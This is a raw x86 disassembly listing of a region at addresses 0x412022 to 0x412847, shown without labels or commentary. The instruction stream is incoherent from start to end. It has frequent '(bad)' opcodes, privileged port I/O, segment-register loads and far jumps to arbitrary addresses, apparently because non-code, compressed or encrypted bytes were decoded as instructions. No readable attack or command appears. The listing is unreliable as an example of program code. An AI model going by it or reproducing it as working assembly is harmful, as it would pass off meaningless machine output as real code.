  412022:	sar    DWORD PTR [edx-0x4e],1
  412025:	(bad)  
  412026:	sbb    esp,DWORD PTR [edx-0x172487fc]
  41202c:	or     edx,edx
  41202e:	(bad)  
  41202f:	rcl    edx,cl
  412031:	jle    0x412001
  412033:	shl    BYTE PTR es:[ebx],cl
  412036:	popf   
  412037:	inc    ecx
  412038:	cmc    
  412039:	adc    BYTE PTR [ebp-0x76f4a7d4],bh
  41203f:	(bad)  [ebp+0x41e67e4c]
  412045:	mov    es,WORD PTR [edi-0x40e8b644]
  41204b:	mov    eax,esi
  41204d:	rol    edi,1
  41204f:	sbb    eax,DWORD PTR [edi+0x26]
  412052:	add    bh,ch
  412054:	sub    al,0x18
  412056:	repnz fcomp DWORD PTR [edi+edi*2]
  41205a:	out    dx,eax
  41205b:	mov    dl,0x5e
  41205d:	fsubr  QWORD PTR ds:0x95e55f06
  412063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412064:	(bad)
  412067:	lods   eax,DWORD PTR ds:[esi]
  412068:	aaa    
  412069:	add    ecx,DWORD PTR [ebp-0x33606c8b]
  41206f:	pop    esi
  412070:	pop    ds
  412071:	pop    ds
  412072:	paddq  mm7,mm5
  412075:	pushf  
  412076:	psubsb mm1,QWORD PTR [ecx+0x37c985]
  41207d:	sub    edi,ebx
  41207f:	sub    cl,bl
  412081:	and    BYTE PTR [ebp+0x5f],ah
  412084:	imul   edx,DWORD PTR [ecx+0xc14b740],0xffffff81
  41208b:	jl     0x412084
  41208d:	xor    edi,0x5b9f29e2
  412093:	inc    ebp
  412094:	dec    edi
  412095:	jle    0x4120b1
  412097:	mov    ss,WORD PTR [ecx]
  412099:	ret    
  41209a:	inc    ebp
  41209b:	push   0x99964494
  4120a0:	or     eax,0x70ea82ed
  4120a5:	push   edx
  4120a6:	mov    WORD PTR [ebp+ebx*8-0x550bbfb1],ss
  4120ad:	mov    ch,0xa6
  4120af:	adc    al,0x2a
  4120b1:	out    0x42,eax
  4120b3:	and    ebx,DWORD PTR [ecx-0x5406196d]
  4120b9:	xor    eax,0x309438b6
  4120be:	outs   dx,BYTE PTR ds:[esi]
  4120bf:	push   ds
  4120c0:	retf   0xfc14
  4120c3:	add    al,0x5f
  4120c5:	int3   
  4120c6:	and    ebx,DWORD PTR [ebp+edx*2-0x3bc24f09]
  4120cd:	pusha  
  4120ce:	mov    cl,0x93
  4120d0:	popa   
  4120d1:	jle    0x4120be
  4120d3:	or     DWORD PTR [ebp+0x6507b4c4],edx
  4120d9:	outs   dx,DWORD PTR ds:[esi]
  4120da:	mov    dh,0x5a
  4120dc:	mov    esp,0x534d82f5
  4120e1:	inc    esp
  4120e2:	xchg   edi,eax
  4120e3:	outs   dx,BYTE PTR ds:[esi]
  4120e4:	dec    esp
  4120e5:	fmul   QWORD PTR [bp+di]
  4120e8:	and    al,0xc
  4120ea:	adc    DWORD PTR [edi-0x1a],0xeec42d72
  4120f1:	mov    dl,ch
  4120f3:	bound  esi,QWORD PTR [eax+0x1f1c4e7a]
  4120f9:	lods   eax,DWORD PTR ds:[esi]
  4120fa:	fisub  WORD PTR [ecx+0x1d27dbc5]
  412100:	fisubr WORD PTR [esi+0x50b29565]
  412106:	or     BYTE PTR [ecx+0x3ff76340],dh
  41210c:	ficom  WORD PTR [ecx-0x46]
  41210f:	ja     0x4120f1
  412111:	leave  
  412112:	sbb    esi,esp
  412114:	xchg   ecx,eax
  412115:	inc    edx
  412116:	mov    bl,0x5c
  412118:	push   eax
  412119:	cmp    ah,BYTE PTR [ebx-0x9]
  41211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41211d:	add    eax,edx
  41211f:	dec    eax
  412120:	mov    ebp,DWORD PTR [eax+eiz*8]
  412123:	xchg   esi,eax
  412124:	adc    DWORD PTR [edi],eax
  412126:	add    eax,0xafe3717d
  41212b:	pop    es
  41212c:	neg    ah
  41212e:	mov    DWORD PTR [ebx+0x33],ecx
  412131:	mov    esp,0x965b2303
  412136:	into   
  412137:	cmp    eax,0xfb4dc4c2
  41213c:	rcl    ebx,0x93
  41213f:	jb     0x4120f6
  412141:	pop    ebp
  412142:	mov    ebp,0xeb9ee6be
  412147:	or     eax,0x2ffa2b6f
  41214c:	mov    ecx,0xe484374c
  412151:	jle    0x412195
  412153:	xlat   BYTE PTR ds:[ebx]
  412154:	dec    eax
  412155:	inc    eax
  412156:	cmp    eax,0x30c99cf6
  41215b:	iret   
  41215c:	or     bl,dl
  41215e:	bound  esi,QWORD PTR [ebx-0x1f]
  412161:	push   ebp
  412162:	dec    edx
  412163:	pop    es
  412164:	shl    DWORD PTR [ebx+ebp*2+0x3d2d0a9d],cl
  41216b:	pop    esi
  41216c:	cs test eax,0x3d77e219
  412172:	push   ds
  412173:	mov    edi,0xf1fa8831
  412178:	xchg   edi,eax
  412179:	mov    BYTE PTR [edx+eax*2+0x14],dl
  41217d:	stos   BYTE PTR es:[edi],al
  41217e:	or     al,0x40
  412180:	(bad)  
  412181:	in     eax,dx
  412182:	push   ecx
  412183:	fimul  DWORD PTR [edi+0x1b]
  412186:	sti    
  412187:	pop    DWORD PTR [ebp-0x65beb479]
  41218d:	sub    bh,cl
  41218f:	jecxz  0x412176
  412191:	js     0x412124
  412193:	mov    al,ds:0x4733632b
  412198:	xor    al,0x40
  41219a:	or     edx,DWORD PTR ds:0xe730b9f5
  4121a0:	sbb    esi,DWORD PTR [ebx-0x7100cb02]
  4121a6:	add    DWORD PTR [ecx-0x3b],ecx
  4121a9:	jbe    0x412179
  4121ab:	jno    0x4121da
  4121ad:	mov    DWORD PTR [edi-0x21],esi
  4121b0:	adc    DWORD PTR [esi-0x750d197],edx
  4121b6:	adc    edx,edx
  4121b8:	jg     0x4121ab
  4121ba:	xlat   BYTE PTR ds:[ebx]
  4121bb:	(bad)  
  4121bd:	add    DWORD PTR [eax],0x7e143dd8
  4121c3:	xor    DWORD PTR [edx-0x321fd5f6],0x68
  4121ca:	dec    ebx
  4121cb:	arpl   WORD PTR [edx+0x25],si
  4121ce:	jbe    0x41222f
  4121d0:	mov    cl,0x93
  4121d2:	jmp    0x2716d8ed
  4121d7:	push   ebx
  4121d8:	aaa    
  4121d9:	inc    edx
  4121da:	cmp    DWORD PTR [edi],0x2c
  4121dd:	ret    0x180a
  4121e0:	add    al,0x82
  4121e2:	xor    DWORD PTR [ebx-0x3],ebx
  4121e5:	mov    ds:0x85f6aa1d,eax
  4121ea:	mov    ebp,0x31b0b85a
  4121ef:	rcr    DWORD PTR [ebp+0x7399b6ab],cl
  4121f5:	jo     0x4121d5
  4121f7:	pop    ebx
  4121f8:	lea    ecx,ds:0xfcbb09e0
  4121fe:	mov    al,ds:0x3d086871
  412203:	adc    eax,0x4627e7c2
  412208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412209:	push   ebx
  41220a:	sbb    eax,0x8bf51557
  41220f:	mov    ecx,0x7586fdc3
  412214:	not    DWORD PTR gs:0x5effb0d3
  41221b:	sbb    eax,0x130585be
  412220:	or     bh,BYTE PTR [esi+ecx*8+0x35]
  412224:	sbb    DWORD PTR [ecx-0x76dd9df2],edi
  41222a:	adc    ebp,eax
  41222c:	jl     0x41229f
  41222e:	(bad)  
  41222f:	xchg   edi,eax
  412230:	dec    edi
  412231:	and    ch,BYTE PTR [ebx-0x7c]
  412234:	dec    ebx
  412235:	sbb    DWORD PTR [edi+0xe],eax
  412238:	pop    esp
  412239:	or     DWORD PTR [edx],0x6384bc74
  41223f:	dec    edi
  412240:	xchg   ebp,eax
  412241:	cmp    al,0xf3
  412243:	add    esp,DWORD PTR ds:[edi]
  412246:	adc    eax,0xdc80b1f0
  41224b:	(bad)  
  41224c:	push   ds
  41224d:	les    esp,FWORD PTR [edx]
  41224f:	retf   
  412250:	push   0x82e3a3cd
  412255:	jo     0x4122a3
  412257:	jp     0x4121e2
  412259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41225a:	xchg   DWORD PTR [edi],eax
  41225c:	shr    BYTE PTR [esi],cl
  41225e:	mov    ecx,DWORD PTR [edi+ebx*4+0x7afce025]
  412265:	popf   
  412266:	sub    BYTE PTR [ebx-0x25ddddbc],bh
  41226c:	retf   0xbc2
  41226f:	mov    ebp,0x3a3ca499
  412274:	mov    ecx,0xf21df765
  412279:	ror    ecx,1
  41227b:	sub    dh,BYTE PTR [edx+0x28]
  41227e:	sahf   
  41227f:	das    
  412280:	inc    ecx
  412281:	push   ebx
  412282:	cs mov ebx,ecx
  412285:	fnstenv [esi]
  412287:	stc    
  412288:	test   BYTE PTR [esi-0x5eedc86e],al
  41228e:	mov    eax,ds:0xda30b316
  412293:	xchg   ebp,eax
  412294:	fwait
  412295:	test   eax,0x79be5d9b
  41229a:	sub    BYTE PTR [ecx],0xcf
  41229d:	xchg   edx,eax
  41229e:	fs fdivr st,st(5)
  4122a1:	aam    0x5d
  4122a3:	sub    esp,DWORD PTR [ecx+0x473d6215]
  4122a9:	(bad)  
  4122aa:	jmp    0x4122ae
  4122ac:	mov    bl,al
  4122ae:	jo     0x4122b6
  4122b0:	mov    ds:0xf1a36c37,eax
  4122b5:	aaa    
  4122b6:	pop    ebp
  4122b7:	jmp    0xaab7d1ed
  4122bc:	adc    al,0x43
  4122be:	call   0x2223:0x73c56989
  4122c5:	(bad)  
  4122c6:	popa   
  4122c7:	add    ch,BYTE PTR [ebp-0x6c015715]
  4122cd:	xor    BYTE PTR [esi+0x47],ah
  4122d0:	out    0x49,eax
  4122d2:	pop    ebx
  4122d3:	xchg   BYTE PTR [ebp+0x7a020737],ch
  4122d9:	fldcw  WORD PTR [edx+ecx*4-0x1942a04c]
  4122e0:	xor    edx,DWORD PTR [edx+0x3e]
  4122e3:	inc    edi
  4122e4:	lds    ebx,FWORD PTR [ebx-0x5c555e78]
  4122ea:	push   esp
  4122eb:	jg     0x41232f
  4122ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122ee:	mov    fs,WORD PTR [edi]
  4122f0:	ins    DWORD PTR es:[edi],dx
  4122f1:	rcl    cl,cl
  4122f3:	and    BYTE PTR [ebx-0x230b1431],dh
  4122f9:	push   edx
  4122fa:	loope  0x4122c0
  4122fc:	and    ebp,DWORD PTR [eax-0x2dbd3164]
  412302:	jno    0x41233b
  412304:	adc    edi,DWORD PTR [ecx+ebx*8-0x28dada2e]
  41230b:	(bad)  
  41230d:	in     al,0xb1
  41230f:	sub    bh,BYTE PTR [edi+0x26]
  412312:	sbb    BYTE PTR [ecx-0x80],dh
  412315:	add    BYTE PTR [edx+0xb520db],bh
  41231b:	cwde   
  41231c:	das    
  41231d:	mov    WORD PTR [ebx+0x2a],?
  412320:	aas    
  412321:	inc    ecx
  412322:	in     al,dx
  412323:	mov    ds:0x8777b55d,al
  412328:	xchg   ecx,eax
  412329:	test   BYTE PTR [esi+ecx*4],ah
  41232c:	(bad)  
  41232d:	shl    DWORD PTR [ecx+0xfeda60c],cl
  412333:	push   eax
  412334:	shl    BYTE PTR [eax+0x73049a54],0x50
  41233b:	jo     0x412341
  41233d:	mov    edi,0x551be275
  412342:	lds    ecx,FWORD PTR [ebx]
  412344:	add    edi,edi
  412346:	dec    esi
  412347:	(bad)  
  412348:	mov    bl,0x7c
  41234a:	test   edx,ebp
  41234c:	mov    al,0xe2
  41234e:	cli    
  41234f:	call   0x7eccd234
  412354:	das    
  412355:	daa    
  412356:	sbb    eax,0xc8b5e251
  41235b:	test   BYTE PTR [edx],bl
  41235d:	(bad)  
  41235f:	jnp    0x4123c3
  412361:	fsub   QWORD PTR [eax-0x68e624b3]
  412367:	fucomi st,st(7)
  412369:	gs push ss
  41236b:	stos   BYTE PTR es:[edi],al
  41236c:	pushf  
  41236d:	mov    es,WORD PTR [ebx]
  41236f:	xor    al,BYTE PTR [esi-0x4ec0d33b]
  412375:	enter  0x2e,0x84
  412379:	shl    BYTE PTR [edx+0x2359547e],cl
  41237f:	ficom  DWORD PTR [ebx]
  412381:	addr16 out dx,al
  412383:	adc    ch,cl
  412385:	test   BYTE PTR [ebx+0x7faa477f],0x93
  41238c:	aam    0x41
  41238e:	test   eax,0xafb5235c
  412393:	es xchg ebp,eax
  412395:	pushw  ds
  412397:	cwde   
  412398:	add    cl,dl
  41239a:	sbb    esi,DWORD PTR [ecx]
  41239c:	enter  0xf751,0xd2
  4123a0:	jg     0x41237d
  4123a2:	add    DWORD PTR [ecx-0x35],esp
  4123a5:	add    eax,0xe6be4803
  4123aa:	inc    ecx
  4123ab:	popf   
  4123ac:	or     ch,BYTE PTR [ebx-0x7ddfe028]
  4123b2:	xchg   ebx,eax
  4123b3:	and    dh,BYTE PTR [eax-0x3c5a4a56]
  4123b9:	lods   eax,DWORD PTR ds:[esi]
  4123ba:	push   cs
  4123bb:	or     al,0x27
  4123bd:	ss pop es
  4123bf:	test   DWORD PTR [ebp-0x5b98d201],ebp
  4123c5:	push   es
  4123c6:	jl     0x4123f9
  4123c8:	mov    eax,0x9195a54
  4123cd:	mov    ds,WORD PTR [eax-0x486391cb]
  4123d3:	imul   ebp,DWORD PTR [ebx+0x15fd49ea],0x76165a00
  4123dd:	clc    
  4123de:	push   esp
  4123df:	fsubr  QWORD PTR [esi+eax*1-0x17adf42a]
  4123e6:	pushf  
  4123e7:	repnz outs dx,DWORD PTR ds:[esi]
  4123e9:	dec    ecx
  4123ea:	ror    edx,0x62
  4123ed:	and    cl,0x54
  4123f0:	push   ss
  4123f1:	adc    DWORD PTR [esi-0x13144d7f],ebp
  4123f7:	aaa    
  4123f8:	jl     0x412413
  4123fa:	jns    0x41246a
  4123fc:	xlat   BYTE PTR ds:[ebx]
  4123fd:	out    dx,al
  4123fe:	xor    eax,0xf42e28c3
  412403:	shl    DWORD PTR [esi-0x3f],0xbe
  412407:	inc    eax
  412408:	shl    BYTE PTR [eax-0x6d],1
  41240b:	sub    al,BYTE PTR [ecx-0x6c]
  41240e:	popf   
  41240f:	sahf   
  412410:	ss cmp al,0x80
  412413:	pop    ecx
  412414:	retf   
  412415:	xor    BYTE PTR [edi+esi*2],ah
  412418:	mov    gs,ecx
  41241a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41241b:	or     DWORD PTR [eax-0x25],eax
  41241e:	jbe    0x41241e
  412420:	cmp    dl,bl
  412422:	xchg   edx,eax
  412423:	iret   
  412424:	push   esp
  412425:	sbb    eax,0xd38dda6
  41242a:	pop    es
  41242b:	push   ss
  41242c:	pop    ds
  41242d:	lods   eax,DWORD PTR ds:[esi]
  41242e:	mov    DWORD PTR [esi+0x2c],0x11866ad5
  412435:	pop    edi
  412436:	inc    edi
  412437:	jmp    0x7522:0x54324b64
  41243e:	sbb    al,0x9c
  412440:	jb     0x412434
  412442:	mov    esp,0x8343b5d
  412447:	test   dl,dh
  412449:	les    ebp,FWORD PTR [ebp+0x26]
  41244c:	rcl    DWORD PTR [eax+0xc4a7349],1
  412452:	pop    edx
  412453:	pop    ds
  412454:	sub    al,0x60
  412456:	pop    ebp
  412457:	(bad)  
  412458:	jl     0x412408
  41245a:	pusha  
  41245b:	imul   edx,DWORD PTR [edx],0x70
  41245e:	sbb    al,0x11
  412460:	mov    bl,0x25
  412462:	ror    BYTE PTR [ecx+ebp*2-0x53c53ff7],1
  412469:	(bad)  
  41246a:	push   ebx
  41246b:	shl    ebx,0x4
  41246e:	iret   
  41246f:	jnp    0x41243e
  412471:	(bad)  
  412472:	sub    DWORD PTR [esi+edx*8+0x4a],esi
  412476:	inc    ecx
  412477:	jmp    0x8628e48b
  41247c:	push   esp
  41247d:	jmp    0x41240d
  41247f:	add    BYTE PTR [eax+0xa137a7],bl
  412485:	adc    eax,0xf3130cd
  41248a:	add    BYTE PTR [ecx+0x5494784f],dh
  412490:	jb     0x412492
  412492:	pop    eax
  412493:	push   DWORD PTR [eax-0x5c]
  412496:	xchg   ebx,eax
  412497:	xchg   edi,eax
  412498:	or     BYTE PTR [ebp+0x45],0x3f
  41249c:	in     eax,dx
  41249d:	fstp   TBYTE PTR [edx]
  41249f:	(bad)  
  4124a0:	xchg   esp,eax
  4124a1:	and    ah,ch
  4124a3:	stos   DWORD PTR es:[di],eax
  4124a5:	jne    0x4124ea
  4124a7:	and    eax,edx
  4124a9:	jbe    0x4124c2
  4124ab:	repz sbb BYTE PTR ds:0x38ecd4d7,dh
  4124b2:	dec    esi
  4124b3:	push   ebp
  4124b4:	adc    eax,0xe5a21b0c
  4124b9:	add    al,0x57
  4124bb:	das    
  4124bc:	sub    dh,BYTE PTR [ecx+0x18]
  4124bf:	mov    al,0x4f
  4124c1:	mov    ecx,0xa4a502d9
  4124c6:	jnp    0x4124e1
  4124c8:	xchg   BYTE PTR [ebx-0x78],dl
  4124cb:	imul   ecx,DWORD PTR cs:[esi+ebx*1-0x11],0x64
  4124d1:	scas   al,BYTE PTR es:[edi]
  4124d2:	mov    eax,0xc0550ee4
  4124d7:	sbb    DWORD PTR [ebx+eax*2+0x2e],edi
  4124db:	xchg   edx,eax
  4124dc:	add    eax,0x6d0d8142
  4124e1:	or     esp,DWORD PTR [edi+0x798c1bc8]
  4124e7:	inc    eax
  4124e8:	sbb    DWORD PTR [edx],esp
  4124ea:	fcomp  QWORD PTR [edi]
  4124ec:	arpl   WORD PTR [ecx],sp
  4124ee:	enter  0xb140,0x9a
  4124f2:	xchg   ebp,eax
  4124f3:	call   0x9d07b393
  4124f8:	test   BYTE PTR [esi+0x26c8b10],ch
  4124fe:	call   0xf7f:0x8aca60e0
  412505:	xchg   ebp,eax
  412506:	cmp    ah,BYTE PTR ds:0x4d0ef38b
  41250c:	push   ds
  41250d:	int3   
  41250e:	xor    al,0x6b
  412510:	push   eax
  412511:	xchg   esi,eax
  412512:	adc    al,0xfb
  412514:	aaa    
  412515:	pop    ecx
  412516:	xchg   ebx,eax
  412517:	push   ss
  412518:	outs   dx,BYTE PTR ds:[esi]
  412519:	xor    BYTE PTR [edx-0x19],0x9d
  41251d:	add    esp,edx
  41251f:	in     eax,0x63
  412521:	leave  
  412522:	das    
  412523:	push   ebp
  412524:	xchg   ecx,eax
  412525:	xchg   ebp,eax
  412526:	push   ss
  412527:	ins    DWORD PTR es:[edi],dx
  412528:	adc    al,0x60
  41252a:	push   esi
  41252b:	or     BYTE PTR [ebx],0xe8
  41252e:	lods   eax,DWORD PTR ds:[esi]
  41252f:	jo     0x4124d0
  412531:	js     0x41259e
  412533:	adc    eax,0x86647d03
  412538:	mov    ebp,0xb631a401
  41253d:	xor    BYTE PTR [ebx+edx*1],al
  412540:	loop   0x41250c
  412542:	fistp  DWORD PTR [edx]
  412544:	dec    ebp
  412545:	mov    ah,0x68
  412547:	repnz mov ch,0x3a
  41254a:	ins    BYTE PTR es:[edi],dx
  41254b:	push   ss
  41254c:	and    eax,0x11bac3d1
  412551:	add    eax,0x89ad38db
  412556:	dec    ebp
  412557:	cwde   
  412558:	inc    edi
  412559:	test   eax,0x4964a760
  41255e:	mov    ebp,0x382b9ac3
  412563:	shr    DWORD PTR [edx-0x181333e0],0x82
  41256a:	cmc    
  41256b:	pop    eax
  41256c:	mov    ebx,0xbdd225b3
  412571:	ins    BYTE PTR es:[edi],dx
  412572:	(bad)  
  412573:	pop    esp
  412574:	js     0x41259b
  412576:	int3   
  412577:	mov    ebp,0x7507af0c
  41257c:	add    BYTE PTR [ecx-0x6e],ch
  41257f:	out    dx,eax
  412580:	xchg   edi,eax
  412581:	nop
  412582:	add    ecx,esp
  412584:	jp     0x41252d
  412586:	xlat   BYTE PTR ds:[ebx]
  412587:	adc    eax,0x5188a76c
  41258c:	mov    dl,0x17
  41258e:	adc    dh,BYTE PTR [ecx+0x66]
  412591:	xor    edi,DWORD PTR [ebp+0x6daf7cf5]
  412597:	mov    ebp,0x9c6c6e5d
  41259c:	adc    eax,0x143223e5
  4125a1:	gs pop es
  4125a3:	bswap  ebx
  4125a5:	jg     0x41260a
  4125a7:	sbb    al,0x7c
  4125a9:	iret   
  4125aa:	adc    BYTE PTR [edi+0x30],dl
  4125ad:	push   esp
  4125ae:	add    DWORD PTR [edi-0x45],ecx
  4125b1:	out    dx,eax
  4125b2:	addr16 push esp
  4125b4:	jl     0x41254f
  4125b6:	pop    esi
  4125b7:	repnz pushf 
  4125b9:	ss ins DWORD PTR es:[edi],dx
  4125bb:	inc    ebp
  4125bc:	pop    edi
  4125bd:	cmp    dh,cl
  4125bf:	in     al,0x6b
  4125c1:	into   
  4125c2:	call   0x506003da
  4125c7:	popa   
  4125c8:	pop    DWORD PTR ds:0x36a4dadc
  4125ce:	and    DWORD PTR [ebp+0x3b8ffcf9],esp
  4125d4:	pop    esp
  4125d5:	mov    dl,BYTE PTR [ebp-0x705ba5ba]
  4125db:	nop
  4125dc:	push   edi
  4125dd:	jge    0x4125ed
  4125df:	inc    esi
  4125e0:	push   ecx
  4125e1:	rcr    BYTE PTR [edi],1
  4125e3:	shl    ebp,cl
  4125e5:	pop    ecx
  4125e6:	mov    bl,0x54
  4125e8:	(bad)  
  4125ea:	mov    ds:0xea3c8199,eax
  4125ef:	and    BYTE PTR ds:0xd2fef2dd,dh
  4125f5:	imul   ebp,DWORD PTR [edx],0x7c
  4125f8:	aad    0xe7
  4125fa:	or     dh,BYTE PTR [eax-0x5b]
  4125fd:	(bad)  
  4125ff:	push   ss
  412600:	aad    0x85
  412602:	in     al,0x82
  412604:	mov    al,0x8f
  412606:	or     dh,BYTE PTR [ebp-0x7c1fda86]
  41260c:	aad    0xd3
  41260e:	push   0xffffffd1
  412610:	call   0x4b8:0x5b53f6a7
  412617:	dec    ebx
  412618:	dec    ecx
  412619:	(bad)
  41261d:	cmp    edi,0xfffffff9
  412620:	fmul   QWORD PTR [edi]
  412622:	xchg   ecx,eax
  412623:	mov    ecx,0xf1280c20
  412628:	out    dx,eax
  412629:	cmp    ch,BYTE PTR [edx+0x67e66e40]
  41262f:	aad    0xb5
  412631:	dec    edi
  412632:	sub    BYTE PTR [ecx],dl
  412634:	in     al,0x2a
  412636:	push   edx
  412637:	ins    DWORD PTR es:[edi],dx
  412638:	inc    esi
  412639:	or     bh,BYTE PTR [ebx]
  41263b:	inc    eax
  41263c:	push   esp
  41263d:	adc    DWORD PTR [edi-0x30999efa],0xffffffeb
  412644:	(bad)  
  412645:	ffree  st(3)
  412647:	adc    dh,bl
  412649:	nop
  41264a:	in     eax,0xb6
  41264c:	arpl   WORD PTR [ecx-0x40],di
  41264f:	call   0x3f4f71ee
  412654:	dec    edx
  412655:	stc    
  412656:	fst    QWORD PTR [ebp+0x78]
  412659:	sbb    al,0xf7
  41265b:	mov    ebp,0x7b7080bb
  412660:	in     eax,dx
  412661:	(bad)  
  412662:	inc    DWORD PTR ds:0x1dd2a3a5
  412668:	popf   
  412669:	jecxz  0x4125f0
  41266b:	jbe    0x412654
  41266d:	rcl    cl,0x39
  412670:	or     bh,BYTE PTR [eax-0x60]
  412673:	xlat   BYTE PTR ds:[ebx]
  412674:	inc    edx
  412675:	and    edx,esp
  412677:	or     edi,ecx
  412679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41267a:	mov    bh,0x9d
  41267c:	aaa    
  41267d:	mul    edi
  41267f:	dec    esi
  412680:	jge    0x41262f
  412682:	push   0xfffffff8
  412684:	sub    eax,0xec5773a8
  412689:	ds mov edx,0xc8e42887
  41268f:	fidiv  WORD PTR [ebx]
  412691:	xchg   ebp,eax
  412692:	mov    edx,0x11fef1
  412697:	lods   eax,DWORD PTR ds:[esi]
  412698:	and    ah,BYTE PTR [edx]
  41269a:	or     al,0x2a
  41269c:	and    esp,DWORD PTR [ebp-0x2c]
  41269f:	addps  xmm3,XMMWORD PTR [esi]
  4126a2:	xchg   ecx,eax
  4126a3:	sub    ecx,eax
  4126a5:	ret    
  4126a6:	dec    esp
  4126a7:	push   esi
  4126a8:	xor    DWORD PTR [ecx+ecx*1-0x51bab269],ebp
  4126af:	fstp   QWORD PTR [edx+0x773a801b]
  4126b5:	add    eax,edx
  4126b7:	cld    
  4126b8:	mov    ecx,0xf6d02dd
  4126bd:	lds    eax,FWORD PTR [ebx+0x374699d]
  4126c3:	sbb    DWORD PTR [edi-0x1e20ebb7],0x9a1612c2
  4126cd:	shr    DWORD PTR [eax],0xc8
  4126d0:	pop    esi
  4126d1:	pop    ds
  4126d2:	mov    ds:0x2c4c79ef,al
  4126d7:	add    al,0x91
  4126d9:	pop    eax
  4126da:	in     eax,0x10
  4126dc:	and    ch,BYTE PTR [esi+eax*4-0x703fc379]
  4126e3:	xor    ebp,esp
  4126e5:	out    dx,al
  4126e6:	jno    0x412708
  4126e8:	ret    0x19b
  4126eb:	test   BYTE PTR [esi+0x74d702fd],0x88
  4126f2:	retf   0x7abc
  4126f5:	and    BYTE PTR [edx-0x520a12cc],ah
  4126fb:	xchg   esi,eax
  4126fc:	ror    DWORD PTR [ebx+0x4a],0x7f
  412700:	in     al,dx
  412701:	retf   0x7f81
  412704:	leave  
  412705:	sbb    BYTE PTR [ecx+ecx*2],0x9b
  412709:	jne    0x4126f1
  41270b:	adc    al,0x1c
  41270d:	inc    esp
  41270e:	mov    bl,0x4f
  412710:	nop
  412711:	push   ecx
  412712:	fdivr  QWORD PTR [ebx]
  412714:	das    
  412715:	jb     0x4126ac
  412717:	lahf   
  412718:	xor    dh,BYTE PTR [ebx+0x75]
  41271b:	inc    eax
  41271c:	call   0xfb8d29a4
  412721:	aas    
  412722:	arpl   WORD PTR [ebp+0x26ec6152],ax
  412728:	sbb    ebp,ebx
  41272a:	ror    DWORD PTR [edi-0x75],0x9d
  41272e:	(bad)  
  41272f:	sbb    DWORD PTR [ebx],ebx
  412731:	stc    
  412732:	adc    al,0xb1
  412734:	dec    esp
  412735:	or     ebp,DWORD PTR [ebx+esi*8+0x559337e8]
  41273c:	pop    edi
  41273d:	sbb    ah,BYTE PTR [esi-0x48]
  412740:	enter  0xb60f,0xd3
  412744:	js     0x4126df
  412746:	xchg   edx,esi
  412748:	pop    ecx
  412749:	aam    0x4b
  41274b:	xchg   ebx,eax
  41274c:	jae    0x41270f
  41274e:	pop    ss
  41274f:	ret    
  412750:	inc    edx
  412751:	jmp    DWORD PTR [edi-0x32]
  412754:	jge    0x4126f1
  412756:	cld    
  412757:	(bad)  
  412758:	retf   0x4db9
  41275b:	sub    eax,ebx
  41275d:	fisub  DWORD PTR [edi+0x46]
  412760:	sbb    dl,bl
  412762:	lds    edx,FWORD PTR [esi+0x35]
  412765:	and    cl,dh
  412767:	dec    ecx
  412768:	cmc    
  412769:	iret   
  41276a:	jns    0x412708
  41276c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41276d:	add    ecx,DWORD PTR [ecx+0x6c6d963f]
  412773:	js     0x412711
  412775:	lahf   
  412776:	ja     0x41277c
  412778:	pop    edi
  412779:	call   0x49ea:0x5a3d
  41277f:	iret   
  412780:	popa   
  412781:	fisttp QWORD PTR [eax+0x3798051f]
  412787:	pusha  
  412788:	dec    esi
  412789:	or     edi,DWORD PTR [edi+0x41]
  41278c:	call   0xaaf81f58
  412791:	sub    DWORD PTR [eax-0x28],edi
  412794:	and    al,0x78
  412796:	ret    0x62a7
  412799:	push   es
  41279a:	jmp    0x6dca18a3
  41279f:	aaa    
  4127a0:	out    0x1f,eax
  4127a2:	imul   edx,DWORD PTR [ebx+0x25],0x8e17701a
  4127a9:	mov    bh,0xc9
  4127ab:	gs push eax
  4127ad:	xchg   ecx,eax
  4127ae:	pop    es
  4127af:	sub    dl,dh
  4127b1:	inc    ebx
  4127b2:	push   esi
  4127b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127b4:	cmp    al,0x87
  4127b6:	fnsave [ebp+0x7c]
  4127b9:	xor    al,0xdb
  4127bb:	jbe    0x41278d
  4127bd:	es out dx,eax
  4127bf:	fist   DWORD PTR [esi+edi*8]
  4127c2:	fild   QWORD PTR [ebp+0x67]
  4127c5:	pushf  
  4127c6:	loope  0x412752
  4127c8:	dec    ebp
  4127c9:	adc    esi,DWORD PTR [ebp+0x182d246a]
  4127cf:	adc    dl,BYTE PTR [esi+0x4ad6d36e]
  4127d5:	das    
  4127d6:	mov    WORD PTR [ebp+0x2a],es
  4127d9:	popa   
  4127da:	addr16 dec esi
  4127dc:	stc    
  4127dd:	js     0x412766
  4127df:	mov    ds:0xf0ca8585,eax
  4127e4:	sbb    ebp,DWORD PTR [ebx-0x71]
  4127e7:	and    bh,dh
  4127e9:	cli    
  4127ea:	mov    edx,0x4b5f0663
  4127ef:	mov    ch,0x3d
  4127f1:	ja     0x4127a7
  4127f3:	sbb    al,0xc0
  4127f5:	arpl   WORD PTR [ebx],dx
  4127f7:	push   0xffffffcd
  4127f9:	inc    ebp
  4127fa:	test   eax,0x9c721f2e
  4127ff:	pop    edx
  412800:	aas    
  412801:	aam    0xe
  412803:	adc    al,BYTE PTR [edi-0x3939f5d6]
  412809:	xor    al,0x6d
  41280b:	(bad)  
  41280c:	mov    ebp,0xdb99ad41
  412811:	in     al,0x45
  412813:	jle    0x412814
  412815:	(bad)  
  412817:	fnstenv [esi+0x5e]
  41281a:	jmp    0xd8d22881
  41281f:	je     0x412883
  412821:	aam    0x6
  412823:	out    dx,al
  412824:	lods   al,BYTE PTR ds:[esi]
  412825:	js     0x412835
  412827:	cmp    BYTE PTR [eax-0xfe76df0],0xd
  41282e:	and    al,0x66
  412830:	mov    eax,0x4ac31a87
  412835:	inc    eax
  412836:	jnp    0x4127d1
  412838:	jo     0x4128a6
  41283a:	dec    ecx
  41283b:	rcr    BYTE PTR [edi+0xc4581b1],cl
  412841:	out    0xdc,al
  412843:	ret    0xf5e0
  412846:	retf   
  412847:	adc    esi,DWORD PTR [edx-0x4fc44376]
